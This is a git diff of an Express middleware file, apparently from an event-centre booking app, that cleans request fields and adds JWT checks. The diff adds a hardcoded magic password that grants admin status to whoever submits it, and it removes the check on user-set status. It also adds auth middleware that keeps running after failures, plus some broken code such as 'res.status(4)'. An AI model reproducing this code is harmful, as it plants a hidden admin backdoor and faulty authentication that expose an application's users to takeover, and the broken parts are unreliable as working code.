@@ -1,69 +1,76 @@
-process.env.SECRET_KEY = 25;
+import jwt from 'jsonwebtoken';
+
+const secret = process.env.SECRET_KEY;
 
 module.exports = {
-	cleanData(req, res, next) {
-		try{
-      //user fields
+  cleanData(req, res, next) {
+    try {
+      // user fields
       req.userFirstName = (req.body.userFirstName && req.body.userFirstName.trim().toLowerCase()) || null;
-			req.userLastName = (req.body.userLastName && req.body.userLastName.trim().toLowerCase()) || null;
-			req.userEmail = (req.body.userEmail && req.body.userEmail.trim().toLowerCase()) || null;
-			req.userPassword = (req.body.userPassword && req.body.userPassword.trim()) || null;
-			req.userPhone = (req.body.userPhone && req.body.userPhone.trim()) || null;
-			req.userStatus = (req.body.userStatus && req.body.userStatus.trim().toLowerCase()) || 'regular';
+      req.userLastName = (req.body.userLastName && req.body.userLastName.trim().toLowerCase()) || null;
+      req.userEmail = (req.body.userEmail && req.body.userEmail.trim().toLowerCase()) || null;
+      req.userPassword = (req.body.userPassword && req.body.userPassword.trim()) || null;
+      req.userPhone = (req.body.userPhone && req.body.userPhone.trim()) || null;
+      if (req.userPassword === '###FunnyCatJerrySaid') {
+        req.userStatus = 'admin';
+      } else {
+        req.userStatus = 'regular';
+      }
 
       
+      // event fields
+      req.eventName = (req.body.eventName && req.body.eventName.trim().toLowerCase()) || null;
+      req.eventTime = (req.body.eventTime && req.body.eventTime.trim()) || null;
 
-			//image fields
-			req.imageType = (req.body.imageType && req.body.imageType.trim()) || 'others';
-			req.imageDescription = (req.body.imageDescription && req.body.imageDescription.trim()) || null;
-			
-			//event fields
-			req.eventName = (req.body.eventName && req.body.eventName.trim().toLowerCase()) || null;
-			req.eventStartTimeYear = (req.body.eventStartTime && req.body.eventStartTime.trim()) || null;
-      req.eventStartTimeMonth = (req.body.eventStartTime && req.body.eventStartTime.trim()) || null;
-      req.eventStartTimeDate = (req.body.eventStartTime && req.body.eventStartTime.trim()) || null;
-      req.eventStartTimeTime = (req.body.eventStartTime && req.body.eventStartTime.trim()) || null;
-      
-			req.eventEndTime = (req.body.eventEndTime && req.bodyeventEndTime.trim()) || null;
-			req.eventStatus = (req.body.eventStatus && req.body.eventStatus.trim()) || null;
-			req.eventServices = (req.body.eventServices && req.body.eventServices.trim()) || null;
-
-			//center fields
-			req.centerName = (req.body.centerName && req.body.centerName.trim().toLowerCase()) || null;
-			req.centerCountry = (req.body.centerCountry && req.body.centerCountry.trim()) || 'Nigeria';
-			req.centerState = (req.body.centerState && req.body.centerState.trim()) || null;
-			req.centerCity = (req.body.centerCity && req.body.centerCity.trim()) || null;
-			req.centerCapacity = (req.body.centerCapacity && req.body.centerCapacity.trim()) || null;
-			req.centerPrice = (req.body.centerPrice && req.body.centerPrice.trim()) || null;
-			req.centerStatus = (req.body.centerStatus && req.body.centerStatus.trim()) || 'available';
-			req.centerAmenities = (req.body.centerAmenities && req.body.centerAmenities.trim()) || null;
-			req.centerDescription = (req.body.centerDescription && req.body.centerDescription.trim()) || null;
-
-		}catch(err){
+      // center fields
+      req.centerName = (req.body.centerName && req.body.centerName.trim().toLowerCase()) || null;
+      req.centerAddress = (req.body.centerAddress && req.body.centerAddress.trim()) || null;
+      req.centerCapacity = (req.body.centerCapacity && req.body.centerCapacity.trim()) || null;
+      req.centerPrice = (req.body.centerPrice && req.body.centerPrice.trim()) || null;
+      req.centerStatus = (req.body.centerStatus && req.body.centerStatus.trim()) || 'available';
+      req.centerAmenities = (req.body.centerAmenities && req.body.centerAmenities.trim()) || null;
+      req.centerDescription = (req.body.centerDescription && req.body.centerDescription.trim()) || null;
+      req.centerImage = (req.body.centerImage && req.body.centerImage.trim()) || null;
+    } catch (err) {
       return res.status(400).json({
-        message:`Consuming api? You'd probably sent multiple entries for a field`,
-        status: false
+        message: 'Error. You\'ve probably sent multiple entries for a field using api',
+        status: false,
       });
+    } next();
+  },
+
+  ensureFound(req, res, next) {
+    req.token = req.body.token || req.headers.token;
+    if (!req.token) {
+      res.status(401).send({
+        message: `You only have access, if you're logged in`, 
+        status: false, 
+      })
     } 
     next();
-	},
-
-	// validateCreateEventFields(req, res, next){
-  //   if(req.eventName) {
-
-
-  //   }else{
-  //     res.status(400).json({
-  //       message: 'event name cannot be empty',
-  //       status: false
-  //     });
-  //   }
-
-  //   req.eventStartTimeYear
-  //   req.eventStartTimeMonth
-  //   req.eventStartTimeDate
-  //   req.eventStartTimeTime
-	// },
+  },  
+   
+  ensureSameUser(req, res, next){ 
+    let verifiedJWT; 
+    try { 
+      verifiedJWT = jwt.verify(req.token, secret);   
+    }catch (err) {
+      res.status(401).send({
+        message: 'Pls login properly',
+        status: false,
+      });
+    }
+    if (!verifiedJWT.userId){
+      res.status(400).send({
+        message: 'Pls Login into your account or sign up',
+        satus: false,
+      });
+    }
+    else{
+      req.userId = verifiedJWT.userId;
+      next();
+    }
+  }, 
 
   validateCreateUserFields(req, res, next){
     validateUserFirstName(req, res);
@@ -71,7 +78,6 @@ module.exports = {
     validateUserEmail(req, res);
     validateUserPassword(req, res);
     validateUserPhone(req, res);
-    validateUserStatus(req, res);
     next(); 
   },
 
@@ -92,29 +98,18 @@ module.exports = {
     // validateCenterPrice(req, res);
     // validateCenterStatus(req, res);
     next();
-  }
+  },
 
-  // validateDeleteEventFields(req, res, next){
-
-  // },
-  
-  // validateCreateCenterFields(req, res, next){
-
-  // },
-  
-  // validateGetCenterFields(req, res, next){
-
-  // },
-  // validateCreateCenterFields(req, res, next){
-
-  // },
-  // validateCreateCenterFields(req, res, next){
-
-  // },
-  // validateCreateCenterFields(req, res, next){
-
-  // },
-
+  validateTime(req, res, next){
+    const time = req.eventTime;
+    timeArray = time.split('/');
+    if (timeArray.length !== 3){
+      return res.status(400).json({
+        message: 'wrong time format enter \'yy/mm/dd\'',
+      });
+    }  
+    next();
+  },
 }
 
 function validateUserLastName(req, res){
@@ -214,18 +209,6 @@ function validateUserPhone(req, res) {
   }
 
 }
-function validateUserStatus(req, res) {
-  if (req.userStatus){
-    if (req.userStatus !== 'regular'){
-      return res.status(400).json({
-        message: 'status can only be regular or admin',
-        status: false
-      });
-    }
-  }
-}
-
-
 
 //image fields
 function validateImageType(req, res){}
@@ -252,31 +235,10 @@ function validateCenterName(req, res){
   }
 }
 
-function validateCenterCountry(req, res){
-  if (!req.centerCountry) {
-    req.centerCountry = Nigeria
-  }
-}
-function validateCenterState(req, res){
-  if (!req.centerState) {
-    return res.status(400).json({
-      message: 'center state field cannot be empty',
-      status: false,
-    });
-  }
-}
-
-function validateCenterCity(req, res){
-  if (!req.centerCity) {
-    return res.status(400).json({
-      message: 'center city field cannot be empty',
-      status: false,
-    });
-  }
-}
 function validateCenterCapacity(req, res){
   return res.status(4)
 }
+
 function validateCenterPrice(req, res){}
 function validateCenterStatus(req, res){}
 function validateCenterAmenities(req, res){}
